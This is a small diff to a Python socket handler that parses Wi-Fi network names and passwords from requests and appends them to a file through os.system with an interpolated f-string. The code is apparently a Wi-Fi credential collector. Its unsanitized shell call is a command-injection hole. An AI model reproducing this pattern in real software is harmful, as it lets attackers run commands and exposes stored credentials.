@@ -38,7 +38,7 @@ class MyHandler(socketserver.BaseRequestHandler):
                 print(data)
                 if data[0].find("network") != -1:
                     network = data[0].split("=")[-1]
-                if data[1].find("password") != -1:
+                if data[1].find("Password") != -1:
                     password = data[1].split("=")[-1]
                 if password != "" and network != "":
                     os.system(f"echo {network}:{password} >> ./wifi.dat")
